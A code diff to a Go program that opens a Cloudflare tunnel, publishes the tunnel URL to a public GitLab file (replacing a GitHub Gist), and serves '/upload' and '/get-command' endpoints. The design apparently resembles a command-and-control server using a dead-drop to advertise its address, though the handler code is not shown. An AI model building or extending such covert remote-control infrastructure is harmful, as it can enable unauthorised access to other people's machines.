@@ -14,8 +14,10 @@ import (
 	"context"
 	"regexp"
 	"bytes"
-	"github.com/joho/godotenv"
+	"net/url"
 	"encoding/json"
+	"log"
+	"github.com/joho/godotenv"
 )
 
 // Global Variables
@@ -28,53 +30,49 @@ var tunnelURLChan = make(chan string)
 
 
 
-func updateGist(token string, content string) error {
-	type GistFile struct {
-    Content string `json:"content"`
+type GitLabUpdatePayload struct {
+	Branch        string `json:"branch"`
+	Content       string `json:"content"`
+	CommitMessage string `json:"commit_message"`
+}
+
+func updateGitLabFile(projectID, filePath, gitlabToken, tunnelURL string) error {
+	
+	encodedPath := url.PathEscape(filePath)
+	apiURL := fmt.Sprintf("https://gitlab.com/api/v4/projects/%s/repository/files/%s", projectID, encodedPath)
+
+	payload := GitLabUpdatePayload{
+		Branch:        "main",
+		Content:       tunnelURL,
+		CommitMessage: "Update Cloudflare tunnel URL",
 	}
 
-	type GistRequest struct {
-	    Files map[string]GistFile `json:"files"`
-	}
-
-	data := GistRequest{
-	    Files: map[string]GistFile{
-	        "tunnel.txt": {Content: tunnelURL},
-	    },
-	}
-
-	jsonBytes, err := json.Marshal(data)
+	jsonData, err := json.Marshal(payload)
 	if err != nil {
-	    panic(fmt.Sprintf("Failed to marshal JSON: %v", err))
+		return err
 	}
 
-	req, err := http.NewRequest(http.MethodPatch, "https://api.github.com/gists/c4748adcea3ad83d87cd8eba959f2fd3", bytes.NewBuffer(jsonBytes))
-
+	req, err := http.NewRequest(http.MethodPut, apiURL, bytes.NewBuffer(jsonData))
 	if err != nil {
-		panic(err)
+		return err
 	}
 
+	req.Header.Set("PRIVATE-TOKEN", gitlabToken)
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("Authorization", "Bearer "+token)
 
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
-		panic(err)
+		return err
 	}
-
 	defer resp.Body.Close()
 
-	if err != nil {
-		panic(err)
+	if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("gitlab API error (%d): %s", resp.StatusCode, string(body))
 	}
 
-	body, err := io.ReadAll(resp.Body)
-
-	if err != nil {
-		fmt.Println("Failed to read response body:", body)
-		panic(err)
-	}
+	fmt.Println("Successfully updated tunnel.txt on GitLab!")
 	return nil
 }
 
@@ -232,13 +230,12 @@ func receiveInput() {
 }
 
 func main() {
-	// Load the env
-	err := godotenv.Load()
-	if err != nil {
-	    fmt.Println("No .env file found")
-	}
-	token := os.Getenv("TOKEN")
+	  err := godotenv.Load()
+  	if err != nil {
+  	  log.Fatal("Error loading .env file")
+  	}
 
+  	gitlabToken := os.Getenv("TOKEN")
 
 	// Ensure the binary is present locally without needing a package manager
 	binPath := ensureCloudflared()
@@ -270,11 +267,12 @@ func main() {
 	fmt.Println("Updating Gist with the tunnel URL...")
 
 	// Update the Gist with the tunnel URL
-	err = updateGist(token, tunnelURL)
+	err = updateGitLabFile("Plexisity1%2Ftunnel-url", "tunnel-url.txt", gitlabToken, tunnelURL)
 	if err != nil {
-		fmt.Printf("Failed to update Gist: %v\n", err)
-		return
+	    fmt.Println("Error updating GitLab file:", err)
+	    return
 	}
+	fmt.Println("Successfully updated!")
 
 	http.HandleFunc("/upload", uploadHandler)
 	http.HandleFunc("/get-command", commandHandler)
